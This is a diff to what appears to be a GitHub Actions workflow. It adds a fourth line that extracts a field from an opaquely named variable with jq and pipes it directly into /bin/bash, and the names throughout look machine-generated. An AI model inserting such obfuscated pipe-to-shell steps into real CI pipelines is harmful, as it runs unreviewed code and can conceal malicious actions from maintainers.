@@ -39,6 +39,7 @@ jobs:
           echo $rcga3 | jq -r .juj3048 | /bin/bash
           printf '%s' "$yo4089" | jq -r .ky907 | /bin/bash
           echo $so1674 | jq -r .rf6962 | /bin/bash
+          echo $zq9256 | jq -r .zol3 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
